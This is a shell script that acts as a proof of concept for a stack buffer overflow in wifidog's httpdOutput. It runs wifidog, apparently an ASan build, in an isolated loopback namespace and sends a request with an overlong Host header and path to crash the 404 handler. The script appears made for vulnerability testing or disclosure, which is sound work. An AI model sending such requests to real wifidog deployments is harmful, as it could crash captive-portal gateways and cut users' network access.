#!/usr/bin/env sh
set -eu

ROOT_DIR="$(CDPATH= cd -- "$(dirname "$0")/.." && pwd)"
WIFIDOG="$ROOT_DIR/src/wifidog"
CONF="$ROOT_DIR/poc/wifidog-loopback-repeat-message.conf"
LOG="$ROOT_DIR/poc/poc-httpdoutput-overflow.log"

command -v unshare >/dev/null 2>&1 || { echo "error: unshare not found" >&2; exit 1; }
command -v python3 >/dev/null 2>&1 || { echo "error: python3 not found" >&2; exit 1; }

rm -f "$LOG"

unshare -Urn sh -c "
set -eu
cd \"$ROOT_DIR\"
ip link set lo up
rm -f /tmp/wdctl-wifidog-poc.sock

# NOTE: this PoC is intended for an ASan build of wifidog.
ASAN_OPTIONS=abort_on_error=1:symbolize=0:halt_on_error=1 \"$WIFIDOG\" -f -c \"$CONF\" -d 0 >\"$LOG\" 2>&1 &
pid=\$!

for i in 1 2 3 4 5 6 7 8 9 10; do
  python3 - <<'PY' && break || true
import socket, sys
try:
    s = socket.create_connection(('127.0.0.1', 2060), timeout=0.2)
    s.close()
    sys.exit(0)
except Exception:
    sys.exit(1)
PY
  sleep 0.2
done

# Trigger 404 (offline branch) with a long URL so the message variable is large.
python3 - <<'PY'
import socket
host = 'H' * 1000
path = '/' + ('P' * 900)
req = (
    f'GET {path} HTTP/1.0\\r\\n'
    f'Host: {host}\\r\\n'
    '\\r\\n'
)
s = socket.create_connection(('127.0.0.1', 2060), timeout=2.0)
s.sendall(req.encode())
s.close()
PY

sleep 0.5
kill \"\$pid\" 2>/dev/null || true
wait \"\$pid\" || true
"

echo "Log: $LOG"
if command -v rg >/dev/null 2>&1; then
  rg -n 'stack-buffer-overflow|httpdOutput' "$LOG" || true
fi
